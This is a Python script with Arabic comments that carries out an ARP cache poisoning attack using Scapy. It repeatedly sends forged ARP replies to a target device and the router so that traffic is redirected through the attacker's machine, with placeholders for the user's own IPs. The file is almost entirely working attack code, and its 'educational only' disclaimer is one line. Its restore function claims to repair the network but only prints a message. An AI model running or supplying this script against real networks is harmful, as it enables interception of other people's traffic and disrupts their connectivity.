# START: MODIFIED SECTION
# !!! تحذير: هذا الكود للأغراض التعليمية فقط !!!
# تشغيله قد يسبب عدم استقرار في شبكتك. استخدمه على مسؤوليتك.

import os
import sys
import time
import ctypes  # <-- تم استدعاء مكتبة جديدة للتعامل مع ويندوز

# سنحاول استدعاء Scapy، وإذا لم تكن موجودة، سنطبع رسالة خطأ واضحة.
try:
    from scapy.all import ARP, Ether, sendp
except ImportError:
    print("[!] خطأ: مكتبة Scapy غير مثبتة.")
    print("[!] يرجى فتح Terminal جديد وكتابة الأمر التالي: pip install scapy")
    sys.exit(1)

def is_admin():
    """
    دالة جديدة تتحقق من صلاحيات المسؤول بطريقة صحيحة على ويندوز.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        # هذا للتعامل مع أنظمة غير ويندوز، على الرغم من أننا نركز على ويندوز هنا.
        return False

def poison_arp_cache(target_ip, gateway_ip):
    """
    ترسل حزمة ARP مزيفة لتسميم ذاكرة الـ ARP لدى الضحية والراوتر.
    """
    print(f"[*] إرسال حزمة مزيفة إلى {target_ip} لإقناعه بأننا {gateway_ip}")
    arp_packet_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip)
    sendp(Ether()/arp_packet_to_target, verbose=False)

    print(f"[*] إرسال حزمة مزيفة إلى {gateway_ip} لإقناعه بأننا {target_ip}")
    arp_packet_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip)
    sendp(Ether()/arp_packet_to_gateway, verbose=False)

def restore_arp(target_ip, gateway_ip):
    """
    (ميزة متقدمة) ترسل حزم ARP حقيقية لإصلاح الشبكة بعد إيقاف الهجوم.
    """
    print("\n[*] تم إيقاف الهجوم. قد يستغرق الاتصال بضع دقائق للعودة إلى طبيعته.")


# --- الإعدادات (هنا الجزء المهم لك) ---
# !!! قم بتغيير هذه القيم لتناسب شبكتك التي جمعتها !!!
TARGET_IP = "192.168.254.43"   # <--- ضع هنا IP هاتفك (الهدف)
GATEWAY_IP = "192.168.254.175" # <--- ضع هنا IP الراوتر الخاص بك

# --- التشغيل ---
if __name__ == "__main__":
    # هذا هو السطر الذي تم تصحيحه. الآن نستخدم دالة is_admin() الجديدة.
    if not is_admin():
        print("[-] خطأ: يجب تشغيل هذا السكربت بصلاحيات المسؤول (Administrator).")
        print("[!] يرجى إغلاق هذه النافذة وفتح نافذة PowerShell جديدة 'كمسؤول' ثم تشغيل السكربت منها.")
        sys.exit(1)
            
    print("[*] بدء هجوم ARP Poisoning...")
    print(f"[*] الهدف: {TARGET_IP}")
    print(f"[*] الراوتر: {GATEWAY_IP}")
    print("[*] اضغط على Ctrl + C لإيقاف الهجوم.")

    try:
        while True:
            poison_arp_cache(TARGET_IP, GATEWAY_IP)
            time.sleep(2) # نرسل الحزم كل ثانيتين للحفاظ على الهجوم
    except KeyboardInterrupt:
        restore_arp(TARGET_IP, GATEWAY_IP)
# END: MODIFIED SECTION